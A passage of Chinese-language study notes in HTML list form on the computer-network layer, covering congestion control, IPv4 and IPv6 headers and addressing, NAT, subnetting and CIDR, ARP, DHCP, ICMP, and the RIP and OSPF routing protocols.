</ul>
</li>
</ul>
</li>
<li>主要问题<ul>
<li>如何获取拥塞信息</li>
<li>利用信息进行控制</li>
</ul>
</li>
<li>作用<ul>
<li>确保网络承载能力</li>
<li>全局性过程<ul>
<li>涉及所有主机、路由器</li>
</ul>
</li>
<li>增加资源不能单独解决</li>
</ul>
</li>
<li>与流量控制的区别<ul>
<li>流量控制：点对点通信量控制</li>
<li>目的：抑制发送速率使接收方来得及接收</li>
</ul>
</li>
<li>控制方法<ul>
<li>开环控制<ul>
<li>特点：静态预防</li>
<li>手段：<ul>
<li>确定接收新流量时机</li>
<li>分组丢弃策略</li>
<li>调度策略</li>
</ul>
</li>
<li>特点：不考虑当前网络状态</li>
</ul>
</li>
<li>闭环控制<ul>
<li>特点：动态方法</li>
<li>原理：基于反馈环路</li>
<li>过程：<ul>
<li>监测网络状态</li>
<li>检测拥塞</li>
<li>传递拥塞信息</li>
<li>调整系统运行</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="4-2-IPV4"><a href="#4-2-IPV4" class="headerlink" title="4.2  IPV4"></a>4.2  IPV4</h2><h3 id="4-2-1-IPv4分组"><a href="#4-2-1-IPv4分组" class="headerlink" title="4.2.1   IPv4分组"></a>4.2.1   IPv4分组</h3><ul>
<li>IPv4概述<ul>
<li>IP定义数据传送的基本单元——IP分组及其确切的数据格式</li>
<li>包含处理规则、错误控制机制</li>
<li>实现非可靠投递和路由选择思想</li>
</ul>
</li>
<li>IPv4分组格式<ul>
<li>组成<ul>
<li>首部<ul>
<li>固定部分(20B)</li>
<li>可选字段(长度可变)</li>
</ul>
</li>
<li>数据部分</li>
</ul>
</li>
<li>重要字段<ul>
<li>版本(4位)<ul>
<li>值为4表示IPv4</li>
</ul>
</li>
<li>首部长度(4位)<ul>
<li>以4B为单位</li>
<li>最大60B(15×4B)</li>
<li>常用20B(5×4B)</li>
</ul>
</li>
<li>总长度(16位)<ul>
<li>首部+数据的总长度</li>
<li>最大65535B</li>
</ul>
</li>
<li>标识(16位)<ul>
<li>数据报唯一标识</li>
<li>分片时复制相同标识</li>
</ul>
</li>
<li>标志(3位)<ul>
<li>MF(More Fragment)</li>
<li>DF(Don’t Fragment)</li>
</ul>
</li>
<li>片偏移(13位)<ul>
<li>以8B为单位</li>
</ul>
</li>
<li>生存时间(TTL)(8位)<ul>
<li>最大路由器跳数</li>
</ul>
</li>
<li>协议(8位)<ul>
<li>上层协议类型</li>
<li>6:TCP,17:UDP</li>
</ul>
</li>
<li>首部检验和(16位)<ul>
<li>仅检验首部</li>
</ul>
</li>
<li>源地址(4B)</li>
<li>目的地址(4B)</li>
</ul>
</li>
</ul>
</li>
<li>IP数据报分片<ul>
<li>分片原因<ul>
<li>链路层MTU限制</li>
<li>不同链路MTU可能不同</li>
</ul>
</li>
<li>分片过程<ul>
<li>标识字段保持相同</li>
<li>设置MF和DF标志</li>
<li>计算片偏移</li>
</ul>
</li>
<li>重组过程<ul>
<li>目的主机重组</li>
<li>使用标识、标志、片偏移字段</li>
</ul>
</li>
<li>分片示例<ul>
<li>4000B数据报(20B首部+3980B数据)</li>
<li>MTU&#x3D;1500B</li>
<li>分3片<ul>
<li>1480B+1480B+1020B</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-2-2-IPv4地址与NAT"><a href="#4-2-2-IPv4地址与NAT" class="headerlink" title="4.2.2   IPv4地址与NAT"></a>4.2.2   IPv4地址与NAT</h3><ul>
<li>IPv4地址<ul>
<li>IP地址定义<ul>
<li>32位全球唯一标识符</li>
<li>由ICANN分配</li>
<li>点分十进制记法</li>
</ul>
</li>
<li>IP地址结构<ul>
<li>分类IP地址（A、B、C类）</li>
<li>组成：网络号 + 主机号<ul>
<li>网络号：互联网范围内唯一</li>
<li>主机号：网络范围内唯一</li>
</ul>
</li>
</ul>
</li>
<li>IP地址特点<ul>
<li>分等级地址结构<ul>
<li>优点：<ul>
<li>方便管理</li>
<li>减小路由表存储空间</li>
</ul>
</li>
</ul>
</li>
<li>标志主机和链路接口<ul>
<li>多网络主机需多个IP地址</li>
</ul>
</li>
<li>同一LAN网络号相同</li>
<li>所有网络平等</li>
<li>同一局域网网络号相同</li>
</ul>
</li>
<li>特殊IP地址<ul>
<li>主机号全0：本网络</li>
<li>主机号全1：直接广播地址</li>
<li>127.x.x.x：环回测试</li>
<li>0.0.0.0：本网络本主机</li>
<li>255.255.255.255：受限广播地址</li>
</ul>
</li>
<li>IP地址使用范围<ul>
<li>A类：网络数2⁷-2</li>
<li>B类&#x2F;C类：早期限制已取消</li>
<li>主机数减2（全0&#x2F;全1不指派）</li>
</ul>
</li>
</ul>
</li>
<li>NAT（网络地址转换）<ul>
<li>定义<ul>
<li>专用网络地址转公用地址</li>
<li>隐藏内部管理IP</li>
<li>节省IP地址</li>
<li>提高安全性</li>
</ul>
</li>
<li>私有IP地址<ul>
<li>范围：<ul>
<li>10.0.0.0&#x2F;8</li>
<li>172.16.0.0&#x2F;12</li>
<li>192.168.0.0&#x2F;16</li>
</ul>
</li>
<li>特点：<ul>
<li>仅用于LAN</li>
<li>可重复使用</li>
<li>需NAT转换才能上网</li>
</ul>
</li>
</ul>
</li>
<li>NAT工作原理<ul>
<li>转换表：{本地IP:端口} ↔ {全球IP:端口}</li>
<li>多私有IP映射单一全球IP</li>
<li>过程：<ul>
<li>①. 主机发送请求</li>
<li>②. NAT修改源地址&#x2F;端口</li>
<li>③. 服务器响应NAT地址</li>
<li>④. NAT转换返回主机</li>
</ul>
</li>
</ul>
</li>
<li>服务器应用<ul>
<li>公网访问私网服务器</li>
<li>配置特定端口映射</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-2-3-划分子网与路由聚合"><a href="#4-2-3-划分子网与路由聚合" class="headerlink" title="4.2.3    划分子网与路由聚合"></a>4.2.3    划分子网与路由聚合</h3><ul>
<li><p>划分子网</p>
<ul>
<li>两级IP地址的缺点<ul>
<li>IP地址空间利用率低</li>
<li>路由表过大影响性能</li>
<li>灵活性不足</li>
</ul>
</li>
<li>划分子网发展<ul>
<li>1985年成为标准协议</li>
<li>增加子网号字段形成三级IP地址</li>
</ul>
</li>
<li>基本思路<ul>
<li>单位内部行为，对外表现单一网络</li>
<li>从主机号借位作为子网号</li>
<li>三级IP地址结构：{网络号,子网号,主机号}</li>
<li>路由器转发流程<ul>
<li>先按目的网络号转发</li>
<li>本单位路由器再按子网号转发</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>子网掩码和默认网关</p>
<ul>
<li>子网掩码作用<ul>
<li>标识主机号借位情况</li>
<li>32位二进制串（1对应网络&#x2F;子网号，0对应主机号）</li>
<li>通过AND运算获取网络地址</li>
</ul>
</li>
<li>默认网关<ul>
<li>子网与外部网络的连接点</li>
<li>路由器接口IP地址</li>
<li>转发非本子网数据</li>
</ul>
</li>
<li>使用规范<ul>
<li>所有网络必须使用子网掩码</li>
<li>未划分子网时使用默认子网掩码<ul>
<li>A类：255.0.0.0</li>
<li>B类：255.255.0.0</li>
<li>C类：255.255.255.0</li>
</ul>
</li>
</ul>
</li>
<li>配置要求<ul>
<li>主机必须同时配置IP和子网掩码</li>
<li>同一子网设备需配置相同子网掩码</li>
<li>路由表关键字段：<ul>
<li>目的网络地址</li>
<li>子网掩码</li>
<li>下一跳地址</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>无分类编址CIDR</p>
<ul>
<li>核心概念<ul>
<li>消除传统ABC类地址划分</li>
<li>使用可变长网络前缀</li>
<li>记法：IP地址&#x2F;前缀位数（如128.14.32.5&#x2F;20）</li>
</ul>
</li>
<li>地址块特性<ul>
<li>最小地址：主机号全0</li>
<li>最大地址：主机号全1</li>
<li>可用地址数：2^N-2（N&#x3D;主机号位数）</li>
</ul>
</li>
<li>特殊说明<ul>
<li>仍可使用”掩码”概念</li>
<li>单位内部可继续划分子网</li>
<li>地址块大小必为2的整数次幂</li>
</ul>
</li>
</ul>
</li>
<li><p>路由聚合</p>
<ul>
<li>原理<ul>
<li>用大CIDR地址块代替多个小地址块</li>
<li>压缩路由表空间</li>
</ul>
</li>
<li>最长前缀匹配规则<ul>
<li>选择网络前缀最长的路由</li>
<li>实现方式：层次式数据结构（如二叉线索）</li>
</ul>
</li>
</ul>
</li>
<li><p>子网划分应用</p>
<ul>
<li>定长子网掩码<ul>
<li>特点<ul>
<li>统一子网掩码</li>
<li>每个子网地址数相同</li>
<li>可能造成浪费</li>
</ul>
</li>
</ul>
</li>
<li>变长子网掩码<ul>
<li>特点<ul>
<li>不同子网使用不同掩码</li>
<li>按需分配地址数量</li>
<li>减少地址浪费</li>
</ul>
</li>
</ul>
</li>
<li>特殊场景<ul>
<li>路由器间链路：使用&#x2F;30地址块（2个可用地址）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-2-4-网络层转发分组的过程"><a href="#4-2-4-网络层转发分组的过程" class="headerlink" title="4.2.4    网络层转发分组的过程"></a>4.2.4    网络层转发分组的过程</h3><ul>
<li>分组转发基于目的主机所在网络<ul>
<li>原因：网络数远小于主机数，压缩转发表大小</li>
<li>路由器根据目的IP地址网络前缀查找转发表</li>
</ul>
</li>
<li>转发表路由信息格式<ul>
<li>(目的网络地址，下一跳地址)</li>
</ul>
</li>
<li>CIDR编址时的转发规则<ul>
<li>最长前缀匹配原则</li>
<li>转发表排序：前缀长度降序排列</li>
</ul>
</li>
<li>特殊路由类型<ul>
<li>特定主机路由<ul>
<li>格式：a.b.c.d&#x2F;32</li>
<li>用途：网络管理员控制和测试网络</li>
<li>匹配优先级最高</li>
</ul>
</li>
<li>默认路由<ul>
<li>格式：0.0.0.0&#x2F;0</li>
<li>用途：路由器到互联网的路由</li>
<li>匹配优先级最低</li>
</ul>
</li>
</ul>
</li>
<li>分组转发算法步骤<ol>
<li>提取目的IP地址D</li>
<li>检查特定主机路由</li>
<li>逐行检查转发表</li>
</ol>
<ul>
<li>子网掩码与D进行AND操作</li>
<li>匹配则转发</li>
</ul>
<ol start="4">
<li>检查默认路由</li>
</ol>
</li>
<li>转发表特点<ul>
<li>不指明完整路径</li>
<li>采用逐步查找下一跳的方式</li>
</ul>
</li>
</ul>
<h3 id="4-2-5-地址解析协议-ARP"><a href="#4-2-5-地址解析协议-ARP" class="headerlink" title="4.2.5   地址解析协议(ARP)"></a>4.2.5   地址解析协议(ARP)</h3><ul>
<li>1.IP地址与硬件地址<ul>
<li>IP地址<ul>
<li>网络层及以上使用</li>
<li>分层式结构</li>
<li>放在IP数据报首部</li>
</ul>
</li>
<li>硬件地址(MAC地址)<ul>
<li>数据链路层使用</li>
<li>平面式结构</li>
<li>放在MAC帧首部</li>
</ul>
</li>
<li>网络层特性<ul>
<li>只能看到IP数据报</li>
<li>路由器只根据目的IP地址转发</li>
<li>局域网链路层只能看到MAC帧</li>
<li>IP层屏蔽硬件地址细节</li>
</ul>
</li>
<li>路由器特性<ul>
<li>有多个IP地址</li>
<li>有多个硬件地址</li>
</ul>
</li>
</ul>
</li>
<li>2.地址解析协议(ARP)<ul>
<li>功能<ul>
<li>IP地址到MAC地址的映射</li>
<li>动态维护ARP表</li>
</ul>
</li>
<li>工作原理<ul>
<li>检查ARP缓存</li>
<li>无缓存时广播ARP请求(目的MAC为FF-FF-FF-FF-FF-FF)</li>
<li>目标主机单播响应</li>
<li>更新ARP缓存</li>
</ul>
</li>
<li>工作层次<ul>
<li>网络层(能看到IP地址)</li>
</ul>
</li>
<li>四种典型情况<ul>
<li>主机→本网络主机</li>
<li>主机→其他网络主机</li>
<li>路由器→直连网络主机</li>
<li>路由器→非直连网络主机</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-2-6-动态主机配置协议-DHCP"><a href="#4-2-6-动态主机配置协议-DHCP" class="headerlink" title="4.2.6   动态主机配置协议(DHCP)"></a>4.2.6   动态主机配置协议(DHCP)</h3><ul>
<li>定义<ul>
<li>动态主机配置协议 (Dynamic Host Configuration Protocol, DHCP)</li>
<li>用于动态分配IP地址</li>
<li>提供即插即用联网机制</li>
<li>应用层协议，基于UDP</li>
</ul>
</li>
<li>配置项目<ul>
<li>IP地址</li>
<li>子网掩码</li>
<li>默认路由器IP地址（默认网关）</li>
<li>域名服务器IP地址</li>
</ul>
</li>
<li>工作原理<ul>
<li>客户&#x2F;服务器模型</li>
<li>主机启动时广播发送发现报文</li>
<li>只有DHCP服务器能回应</li>
<li>服务器查找配置信息<ul>
<li>找到：返回配置信息</li>
<li>找不到：从地址池分配IP</li>
</ul>
</li>
</ul>
</li>
<li>报文交换过程<ul>
<li>DHCP发现<ul>
<li>客户广播”DHCP发现”消息</li>
<li>源地址：0.0.0.0</li>
<li>目的地址：255.255.255.255</li>
</ul>
</li>
<li>DHCP提供<ul>
<li>服务器广播”DHCP提供”消息</li>
<li>包含提供的IP地址</li>
<li>源地址：DHCP服务器地址</li>
<li>目的地址：255.255.255.255</li>
</ul>
</li>
<li>DHCP请求<ul>
<li>客户广播”DHCP请求”消息</li>
<li>源地址：0.0.0.0</li>
<li>目的地址：255.255.255.255</li>
</ul>
</li>
<li>DHCP确认<ul>
<li>服务器广播”DHCP确认”消息</li>
<li>分配IP地址给客户</li>
<li>源地址：DHCP服务器地址</li>
<li>目的地址：255.255.255.255</li>
</ul>
</li>
</ul>
</li>
<li>租用期<ul>
<li>IP地址是临时的</li>
<li>租用期由服务器决定</li>
<li>客户可提出租用期要求</li>
<li>客户可提前终止租用期<ul>
<li>发送释放报文</li>
</ul>
</li>
</ul>
</li>
<li>通信方式<ul>
<li>采用广播方式的原因<ul>
<li>初期不知道服务器IP</li>
<li>中间阶段客户未被分配IP</li>
</ul>
</li>
<li>采用UDP而非TCP的原因<ul>
<li>TCP需要建立连接</li>
<li>不知道对方IP无法建立连接</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-2-7-网际控制报文协议-ICMP"><a href="#4-2-7-网际控制报文协议-ICMP" class="headerlink" title="4.2.7    网际控制报文协议(ICMP)"></a>4.2.7    网际控制报文协议(ICMP)</h3><ul>
<li>功能<ul>
<li>报告差错和异常情况</li>
<li>封装在IP数据报中发送</li>
<li>网络层协议</li>
</ul>
</li>
<li>ICMP报文类型<ul>
<li>ICMP差错报告报文<ul>
<li>常用类型<ul>
<li>终点不可达</li>
<li>源点抑制</li>
<li>时间超过</li>
<li>参数问题</li>
<li>改变路由(重定向)</li>
</ul>
</li>
<li>不发送ICMP差错报告报文的情况<ul>
<li>对ICMP差错报告报文</li>
<li>对第一个分片的数据报片的所有后续数据报片</li>
<li>对具有多播地址的数据报</li>
<li>对具有特殊地址(如127.0.0.0或0.0.0.0)的数据报</li>
</ul>
</li>
</ul>
</li>
<li>ICMP询问报文<ul>
<li>常用类型<ul>
<li>回送请求和回答报文</li>
<li>时间戳请求和回答报文</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>ICMP应用<ul>
<li>分组网间探测PING<ul>
<li>使用ICMP回送请求和回答报文</li>
</ul>
</li>
<li>Traceroute&#x2F;Tracert<ul>
<li>使用ICMP时间超过报文</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="4-3-IPV6"><a href="#4-3-IPV6" class="headerlink" title="4.3  IPV6"></a>4.3  IPV6</h2><h3 id="4-3-1-IPv6的特点"><a href="#4-3-1-IPv6的特点" class="headerlink" title="4.3.1    IPv6的特点"></a>4.3.1    IPv6的特点</h3><ul>
<li>IPv4的问题<ul>
<li>地址耗尽问题<ul>
<li>解决措施<ul>
<li>采用无类别编址CIDR</li>
<li>采用网络地址转换(NAT)</li>
<li>采用IPv6</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>IPv6的主要特点<ul>
<li>更大的地址空间<ul>
<li>128位地址</li>
<li>地址空间是IPv4的2^96倍</li>
</ul>
</li>
<li>扩展的地址层次结构</li>
<li>灵活的首部格式<ul>
<li>可选的扩展首部</li>
<li>提高路由器处理效率</li>
</ul>
</li>
<li>改进的选项<ul>
<li>固定首部长度</li>
<li>选项放在有效载荷中</li>
</ul>
</li>
<li>允许协议继续扩充</li>
<li>支持即插即用(自动配置)<ul>
<li>不需要使用DHCP</li>
</ul>
</li>
<li>支持资源的预分配<ul>
<li>支持实时音&#x2F;视频应用</li>
</ul>
</li>
<li>分片机制<ul>
<li>只有源主机才能分片</li>
<li>端到端分片</li>
</ul>
</li>
<li>固定首部长度<ul>
<li>40B固定长度</li>
</ul>
</li>
<li>增大了安全性<ul>
<li>身份鉴别和保密功能</li>
</ul>
</li>
</ul>
</li>
<li>IPv6兼容性<ul>
<li>与IPv4不兼容</li>
<li>与其他互联网协议兼容<ul>
<li>TCP</li>
<li>UDP</li>
<li>ICMP</li>
<li>IGMP</li>
<li>DNS</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-3-2-IPv6数据报的基本首部"><a href="#4-3-2-IPv6数据报的基本首部" class="headerlink" title="4.3.2   IPv6数据报的基本首部"></a>4.3.2   IPv6数据报的基本首部</h3><ul>
<li>IPv6 数据报组成<ul>
<li>基本首部</li>
<li>有效载荷<ul>
<li>扩展首部</li>
<li>数据部分</li>
</ul>
</li>
</ul>
</li>
<li>IPv6与IPv4首部字段对比<ul>
<li>取消的字段<ul>
<li>首部长度字段</li>
<li>服务类型字段</li>
<li>总长度字段</li>
<li>标识、标志和片偏移字段</li>
<li>TTL字段</li>
<li>协议字段</li>
<li>检验和字段</li>
<li>选项字段</li>
</ul>
</li>
<li>更改的字段<ul>
<li>跳数限制字段（原TTL字段）</li>
<li>下一个首部字段（原协议字段）</li>
</ul>
</li>
</ul>
</li>
<li>IPv6基本首部特点<ul>
<li>字段数减少到8个</li>
<li>长度增大到40B</li>
</ul>
</li>
<li>IPv6基本首部字段<ul>
<li>版本（4位）</li>
<li>通信量类（8位）</li>
<li>流标号（20位）</li>
<li>有效载荷长度（16位）</li>
<li>下一个首部（8位）</li>
<li>跳数限制（8位）</li>
<li>源地址（128位）</li>
<li>目的地址（128位）</li>
</ul>
</li>
</ul>
<h3 id="4-3-3-IPv6地址"><a href="#4-3-3-IPv6地址" class="headerlink" title="4.3.3   IPv6地址"></a>4.3.3   IPv6地址</h3><ul>
<li>基本类型<ul>
<li>单播<ul>
<li>点对点通信</li>
</ul>
</li>
<li>多播<ul>
<li>一点对多点通信</li>
<li>数据报发送到一组计算机中的每一台</li>
</ul>
</li>
<li>任播<ul>
<li>IPv6新增类型</li>
<li>终点是一组计算机</li>
<li>数据报只交付其中一台（通常距离最近）</li>
</ul>
</li>
</ul>
</li>
<li>表示法<ul>
<li>冒号十六进制记法<ul>
<li>每4位用一个十六进制数表示</li>
<li>冒号分隔每16位</li>
<li>示例：4BF5:AA12:0216:FEBC:BA5F:039A:BE9A:2170</li>
</ul>
</li>
<li>缩写表示法<ul>
<li>16位域开头有0时可缩写</li>
<li>域中至少保留一个数字</li>
<li>示例：4BF5:0:0:0:BA5F:39A:A:2176</li>
</ul>
</li>
<li>双冒号缩写<ul>
<li>用于相继的0值域</li>
<li>一个地址中仅能出现一次</li>
<li>示例：4BF5::BA5F:39A:A:2176</li>
</ul>
</li>
</ul>
</li>
<li>地址分类<ul>
<li>未指明地址<ul>
<li>不能用作目的地址</li>
<li>只能用于未配置IPv6地址的主机作为源地址</li>
</ul>
</li>
<li>环回地址<ul>
<li>作用与IPv4环回地址相同</li>
<li>IPv6仅此一个</li>
</ul>
</li>
<li>多播地址<ul>
<li>作用与IPv4相同</li>
<li>占IPv6地址空间的1&#x2F;256</li>
</ul>
</li>
<li>本地链路单播地址<ul>
<li>类似于IPv4的私有IP地址</li>
</ul>
</li>
<li>全球单播地址<ul>
<li>三级结构<ul>
<li>全球路由选择前缀（48位）<ul>
<li>相当于IPv4的网络号</li>
</ul>
</li>
<li>子网标识符（16位）<ul>
<li>用于机构构建子网</li>
</ul>
</li>
<li>接口标识符（64位）<ul>
<li>相当于IPv4的主机号</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>接口标识符特点<ul>
<li>64位长度</li>
<li>可直接编码硬件地址</li>
<li>无需使用ARP进行地址解析</li>
</ul>
</li>
</ul>
<h3 id="4-3-4-从IPv4-向IPv6过渡"><a href="#4-3-4-从IPv4-向IPv6过渡" class="headerlink" title="4.3.4   从IPv4 向IPv6过渡"></a>4.3.4   从IPv4 向IPv6过渡</h3><ul>
<li>过渡特点<ul>
<li>逐步演进</li>
<li>新安装的IPv6系统必须向后兼容</li>
<li>IPv6系统要求<ul>
<li>能接收和转发IPv4分组</li>
<li>能为IPv4分组选择路由</li>
</ul>
</li>
</ul>
</li>
<li>过渡策略(2023)<ul>
<li>双协议栈<ul>
<li>定义<ul>
<li>一台设备同时装有IPv4和IPv6协议栈</li>
<li>分别配置IPv4和IPv6地址</li>
</ul>
</li>
<li>功能<ul>
<li>能与IPv4网络通信</li>
<li>能与IPv6网络通信</li>
</ul>
</li>
<li>通信机制<ul>
<li>与IPv6主机通信：使用IPv6地址</li>
<li>与IPv4主机通信：使用IPv4地址</li>
</ul>
</li>
<li>DNS解析过程<ul>
<li>返回IPv4地址：使用IPv4地址</li>
<li>返回IPv6地址：使用IPv6地址</li>
</ul>
</li>
</ul>
</li>
<li>隧道技术<ul>
<li>实现方式<ul>
<li>IPv6数据报进入IPv4网络时<ul>
<li>将整个IPv6数据报封装成IPv4数据报的数据部分</li>
</ul>
</li>
<li>IPv4数据报离开IPv4网络时<ul>
<li>将数据部分交给主机的IPv6协议</li>
</ul>
</li>
</ul>
</li>
<li>效果<ul>
<li>IPv6数据报在IPv4网络中传输</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="4-4-路由算法与路由协议"><a href="#4-4-路由算法与路由协议" class="headerlink" title="4.4   路由算法与路由协议"></a>4.4   路由算法与路由协议</h2><h3 id="4-4-1-路由算法"><a href="#4-4-1-路由算法" class="headerlink" title="4.4.1    路由算法"></a>4.4.1    路由算法</h3><ul>
<li>定义<ul>
<li>路由选择协议的核心是路由算法</li>
<li>目的是找到从源路由器到目的路由器的”最佳”路径</li>
<li>“最佳”通常指具有最低费用的路径</li>
</ul>
</li>
<li>分类<ul>
<li>静态路由与动态路由<ul>
<li>静态路由算法<ul>
<li>由网络管理员手工配置</li>
<li>特点：简单、开销小</li>
<li>缺点：不能及时适应网络状态变化</li>
<li>适用场景：小型简单网络</li>
</ul>
</li>
<li>动态路由算法<ul>
<li>根据网络流量和拓扑变化动态调整</li>
<li>特点：实现复杂、开销大</li>
<li>优点：能适应网络状态变化</li>
<li>适用场景：复杂大型网络</li>
<li>子分类<ul>
<li>距离-向量路由算法</li>
<li>链路状态路由算法</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>距离-向量路由算法<ul>
<li>基础：Bellman-Ford算法</li>
<li>基本思想<ul>
<li>每个节点维护：<ul>
<li>到直接邻居的链路费用</li>
<li>自身距离向量（到其他节点的费用）</li>
<li>邻居的距离向量</li>
</ul>
</li>
<li>定期交换距离向量</li>
<li>使用公式更新：d(y)&#x3D;min{c(x,v)+d(v)}</li>
</ul>
</li>
<li>实现过程<ul>
<li>初始化阶段</li>
<li>第一次交换更新</li>
<li>后续交换直至收敛</li>
</ul>
</li>
<li>特点<ul>
<li>更新报文大小与网络节点数量成正比</li>
<li>典型实现：RIP协议（使用跳数作为度量）</li>
</ul>
</li>
<li>示例<ul>
<li>三节点网络示例</li>
<li>初始状态</li>
<li>第一次更新后</li>
<li>第二次更新后收敛</li>
</ul>
</li>
</ul>
</li>
<li>链路状态路由算法<ul>
<li>定义<ul>
<li>每个节点知道全网拓扑</li>
<li>执行任务：<ul>
<li>测试相邻节点状态</li>
<li>定期传播链路状态</li>
</ul>
</li>
</ul>
</li>
<li>工作原理<ul>
<li>使用Dijkstra算法计算最短路径</li>
<li>链路状态变化时重新计算</li>
</ul>
</li>
<li>优点<ul>
<li>适用于大型网络</li>
<li>链路状态报文大小与网络规模无关</li>
<li>易于故障排查</li>
<li>保证一步汇聚</li>
</ul>
</li>
<li>典型实现：OSPF协议</li>
</ul>
</li>
<li>两种算法比较<ul>
<li>距离-向量算法<ul>
<li>仅与直接邻居通信</li>
<li>发送整个路由表</li>
<li>报文大小与节点数量相关</li>
</ul>
</li>
<li>链路状态算法<ul>
<li>与所有节点通信（广播）</li>
<li>仅发送直接链路信息</li>
<li>报文大小固定</li>
</ul>
</li>
<li>规模可伸展性：链路状态算法更优</li>
</ul>
</li>
</ul>
<h3 id="4-4-2-分层次的路由选择协议"><a href="#4-4-2-分层次的路由选择协议" class="headerlink" title="4.4.2   分层次的路由选择协议"></a>4.4.2   分层次的路由选择协议</h3><ul>
<li>互联网采用自适应的、分布式路由选择协议</li>
<li>划分为许多较小的自治系统 (Autonomous System, AS)<ul>
<li>定义：在单一技术管理下的一组路由器</li>
<li>特点：<ul>
<li>使用一种AS内部的路由选择协议</li>
<li>共同的度量</li>
<li>对外表现单一和一致的路由选择策略</li>
</ul>
</li>
</ul>
</li>
<li>路由选择协议分类：<ul>
<li>①. 内部网关协议 (IGP)<ul>
<li>定义：在一个自治系统内部使用的路由选择协议</li>
<li>特点：<ul>
<li>与其他自治系统选用的协议无关</li>
<li>常用协议：<ul>
<li>RIP</li>
<li>OSPF</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>②. 外部网关协议 (EGP)<ul>
<li>定义：在不同自治系统间传递路由选择信息的协议</li>
<li>应用场景：<ul>
<li>源主机和目的主机处在不同自治系统</li>
<li>数据报传到自治系统边界时使用</li>
</ul>
</li>
<li>常用协议：<ul>
<li>BGP-4</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>路由选择类型：<ul>
<li>域间路由选择：自治系统之间的路由选择</li>
<li>域内路由选择：自治系统内部的路由选择</li>
</ul>
</li>
<li>两个自治系统互连示意图<ul>
<li>自治系统A<ul>
<li>路由器R1<ul>
<li>运行：<ul>
<li>内部网关协议 (如RIP)</li>
<li>外部网关协议 (如BGP-4)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>自治系统B<ul>
<li>路由器R2<ul>
<li>运行：<ul>
<li>内部网关协议 (如OSPF)</li>
<li>外部网关协议 (如BGP-4)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-4-3-路由信息协议-RIP"><a href="#4-4-3-路由信息协议-RIP" class="headerlink" title="4.4.3    路由信息协议(RIP)"></a>4.4.3    路由信息协议(RIP)</h3><ul>
<li><p>RIP的规定</p>
<ul>
<li>每个路由器维护距离向量</li>
<li>使用跳数衡量距离<ul>
<li>直接连接网络距离&#x3D;1</li>
<li>每经过一个路由器距离+1</li>
</ul>
</li>
<li>好的路由&#x3D;跳数少</li>
<li>最大跳数&#x3D;15（16表示不可达）<ul>
<li>防止环路</li>
</ul>
</li>
<li>路由表项格式<ul>
<li>&lt;目的网络N, 距离d, 下一跳路由器地址X&gt;</li>
</ul>
</li>
</ul>
</li>
<li><p>RIP的特点</p>
<ul>
<li>交换信息对象<ul>
<li>仅与直接相邻路由器交换</li>
</ul>
</li>
<li>交换内容<ul>
<li>整个路由表</li>
</ul>
</li>
<li>交换时机<ul>
<li>固定时间间隔（30秒）</li>
<li>拓扑变化时及时通告</li>
</ul>
</li>
<li>收敛过程<ul>
<li>初始仅知直接连接网络</li>
<li>通过周期性交换最终收敛</li>
</ul>
</li>
<li>RIP协议特性<ul>
<li>应用层协议</li>
<li>使用UDP传输（端口520）</li>
<li>选择最少跳数路径</li>
</ul>
</li>
</ul>
</li>
<li><p>RIP的距离向量算法</p>
<ul>
<li>处理相邻路由器RIP报文步骤<ul>
<li>修改报文<ul>
<li>下一跳地址改为X</li>
<li>所有距离字段+1</li>
</ul>
</li>
<li>更新路由表<ul>
<li>新目的网络：添加</li>
<li>已有目的网络且下一跳相同：更新</li>
<li>已有目的网络但下一跳不同：比较距离</li>
<li>其他情况：不处理</li>
</ul>
</li>
<li>超时处理<ul>
<li>180秒未收到更新则标记为不可达（距离&#x3D;16）</li>
</ul>
</li>
</ul>
</li>
<li>路由表更新示例<ul>
<li>R6和R4互为相邻路由器</li>
<li>R6收到R4路由表后的更新过程</li>
</ul>
</li>
</ul>
</li>
<li><p>RIP的优缺点</p>
<ul>
<li>优点<ul>
<li>实现简单</li>
<li>开销小</li>
<li>收敛较快</li>
<li>好消息传播快</li>
</ul>
</li>
<li>缺点<ul>
<li>网络规模受限（最大15跳）</li>
<li>交换完整路由表导致开销大</li>
<li>坏消息传播慢（慢收敛）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-4-4-开放最短路径优先-OSPF-协议"><a href="#4-4-4-开放最短路径优先-OSPF-协议" class="headerlink" title="4.4.4   开放最短路径优先(OSPF )协议"></a>4.4.4   开放最短路径优先(OSPF )协议</h3><ul>
<li>基本特点<ul>
<li>OSPF和RIP的比较(2024)<ul>
<li>OSPF使用洪泛法向本自治系统中所有路由器发送信息</li>
<li>RIP仅向自己相邻的几个路由器发送信息</li>
<li>OSPF发送的信息是与本路由器相邻的所有路由器的链路状态</li>
<li>RIP发送的信息是本路由器所知道的全部信息</li>
<li>OSPF只有当链路状态发生变化时才发送信息</li>
<li>RIP不管网络拓扑是否变化都要定期交换信息</li>
</ul>
</li>
<li>OSPF是网络层协议，直接用IP数据报传送(协议字段为89)</li>
<li>RIP是应用层协议，使用UDP传输</li>
<li>其他特点<ul>
<li>允许对每条路由设置不同代价</li>
<li>支持多路径负载均衡</li>
<li>分组具有鉴别功能</li>
<li>支持可变长度子网划分和CIDR</li>
<li>链路状态带32位序号</li>
</ul>
</li>
</ul>
</li>
<li>基本工作原理<ul>
<li>建立链路状态数据库(全网拓扑结构图)</li>
